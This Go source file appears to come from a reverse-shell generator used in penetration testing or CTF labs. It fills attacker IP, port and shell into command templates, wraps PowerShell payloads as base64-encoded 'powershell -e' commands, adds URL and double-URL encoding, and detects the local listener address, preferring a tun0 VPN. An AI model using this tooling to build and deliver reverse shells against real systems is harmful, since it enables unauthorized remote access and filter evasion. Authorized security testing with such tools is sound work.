package cmd

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"slices"
	"strings"
	"unicode/utf16"
)

type IPSource struct {
	Address string
	Source  string
	Primary bool
}

func getCommand(params CommandParams) string {
	var ip, port, shell string

	if ip = params.IPAddress; ip == "" {
		ip = "10.10.13.37"
	}
	if port = params.Port; port == "" {
		port = "9001"
	}
	if shell = params.Shell; shell == "" {
		shell = "sh"
	}
	for _, cmd := range revShells {
		if cmd.Name == params.Name && cmd.Method == params.Method {
			cmd.Command = strings.ReplaceAll(cmd.Command, "{ip}", ip)
			cmd.Command = strings.ReplaceAll(cmd.Command, "{port}", port)
			cmd.Command = strings.ReplaceAll(cmd.Command, "{shell}", shell)

			if params.Name == "powershell" && (params.Method == "base64" || params.Method == "5") {
				utf16le := utf16.Encode([]rune(cmd.Command))
				buf := new(bytes.Buffer)
				for _, r := range utf16le {
					_ = binary.Write(buf, binary.LittleEndian, r)
				}
				b64 := base64.StdEncoding.EncodeToString(buf.Bytes())
				cmd.Command = fmt.Sprintf("powershell -e %s", b64)
			}

			return cmd.Command
		}
	}
	return ""
}

func getMethod(m string) []string {
	var v []string
	for _, cmd := range revShells {
		if cmd.Name == m {
			v = append(v, cmd.Method)
		}
	}
	return v
}

func getType() []string {
	var n []string
	for _, cmd := range revShells {
		n = append(n, cmd.Name)
	}
	slices.Sort(n)
	v := slices.Compact(n)
	return v
}

func getIPWithMetadata() []IPSource {
	var ipSources []IPSource
	var ips []string
	config := readConfigFromFile()
	if config.IPAddress != "" {
		ipSources = append(ipSources, IPSource{
			Address: config.IPAddress,
			Source:  "config",
			Primary: true,
		})
		ips = append(ips, config.IPAddress)
	}
	ifaces, err := net.Interfaces()
	if err != nil {
		return ipSources
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					source := iface.Name
					ipSource := IPSource{
						Address: ipnet.IP.String(),
						Source:  source,
						Primary: len(ips) == 0,
					}
					if iface.Name == "tun0" {
						ipSource.Source = "VPN tunnel (tun0)"
						ipSources = append([]IPSource{ipSource}, ipSources...)
					} else {
						ipSources = append(ipSources, ipSource)
					}
					ips = append(ips, ipnet.IP.String())
				}
			}
		}
	}
	return ipSources
}

func getIP() []string {
	ipSources := getIPWithMetadata()
	ips := make([]string, len(ipSources))
	for i, src := range ipSources {
		ips[i] = src.Address
	}
	return ips
}

func setEncoding(encoding, rshell string) string {
	var enc string
	switch encoding {
	case "none":
		enc = rshell
	case "base64":
		enc = base64.StdEncoding.EncodeToString([]byte(rshell))
	case "url":
		enc = url.QueryEscape(rshell)
	case "doubleurl":
		enc = url.QueryEscape(url.QueryEscape(rshell))
	default:
		enc = rshell
	}
	return enc
}
